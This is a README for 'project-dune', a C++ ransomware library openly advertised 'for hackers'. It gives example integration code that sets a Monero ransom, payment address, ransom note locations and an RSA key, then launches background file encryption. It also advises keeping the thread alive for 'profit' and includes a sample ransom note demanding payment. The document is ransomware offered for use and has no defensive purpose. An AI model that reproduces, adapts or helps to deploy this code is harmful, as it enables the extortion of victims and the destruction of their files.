# project-dune
An customizable ransomware for hackers. 
## Usage

Example integration
```cpp
#include <iostream>
#include <vector>
#include <string>
#include <chrono>
#include "inc/dune.hpp"

int main(int argc, char *argv[])
{
    std::vector<std::string> notes;
    notes.push_back("./ransom.txt");
    notes.push_back("/ransom.txt");
    std::string public_key = "-----BEGIN PUBLIC KEY-----\n"
                             "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3LhafKJnVq/xa/1d40hcETsyG\n"
                             "CLSxlhXfJWERLPY14Di6EyKZj+e7+IpZF489pxnDEode2UaN/Mq0/hCy8epOrfx1\n"
                             "0BKGlxY72fPDt9MvThCs6DokeK4cIzcMEKQv4RNBF8q3winAM1SGnxLu7RWx2npF\n"
                             "ND8Xa8c7d8il4AjK5QIDAQAB\n"
                             "-----END PUBLIC KEY-----\n";
    std::vector<std::string> exempt_files = std::vector<std::string>();
    exempt_files.push_back("0ef71b11630f2ffb4e796e7923300d67a763eaca");
    exempt_files.push_back("c9831e93135c07e60e86d0cea63a878cb512764f");

    dune::Dune dune = dune::Dune(2.0, "XMR", "your address here", "You have been pwned!", notes, "tech@anon.gov", public_key, exempt_files);
    dune::Acknowledgement ack;
    ack.are_you_sure_you_want_to_do_this = true;
    ack.i_accept_the_risks_and_consequences_of_my_actions = true;
    ack.i_understand_it_is_illegel = true;
    dune.attack(ack, "./");
    printf("All done\n");
    return 0;
}
```

The Dune ransomware class contains two essential methods. The attack method and the constructor. The constructor accepts several required arguments to tell the malware how to behave (Ex: what crypto address to demand). The most critical parameter is the PEM formatted RSA key. The RSA public key must be valid, or behavior is not guaranteed. The class requires a string vector containing absolute or relative file paths to be supplied to create many ransom notes. The more, the better. The class also takes an argument specifying the amount and type of cryptocurrency to be ransomed. It also accepts a message to include in the ransom file and can be left as an empty string. Also, there is an email parameter so the victim can contact the ransomer.

## Notes
The attack method creates a thread to encrypt all files in the background. Since this could take a while, you must create a while loop to wait until verify_done returns `true`. Remember to sleep between calls to it, or it will slow the encryption. It would be best if you did this to keep the thread alive, or encryption will likely result in corrupt files and no profit.

Example:
```cpp
dune.attack(ack, true);

while (!dune.verify_done()) {
    std::this_thread::sleep_for(std::chrono::milliseconds(5000));
}
```

This is an example Dune ransonware note file:
```
Message from hacker: You have been pwned!

You must pay in this type of cryptocurrency XMR.
The ransom amount is 2.000000 XMR.
The address to pay is: 

your address here

This address is specific to this attack. If you have multiple attacks pending paying another address will not help you regain your files. The full amount or more must be paid to the XMR address specified.
DO NOT MODIFY THIS, OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key for decryption)

jdnXNse+wTWGPQAec/5oLR/albnGS5f6QiOxpvY15CaEJgB7RsYf7oV/y1BclATw5MtElCZmN+mQFs0KaYGr+/KF6xDzGgfB0bpCax9HzVyBl0uGpOIElaZgUI1R2KkNm80ggX7bSH6+c23BiGUTGTac2BCpvSDfe6KVVWoZkZ4=

Send this whole file to this email address AFTER you have paid the ransom: tech@anon.gov

If you contact this email before the ransom is paid in full it will likely be increased.


This is your victim id: 4a357c9d-3868-4b84-afb0-26661ac9f2e6.
```

Enjoy the easy integration.
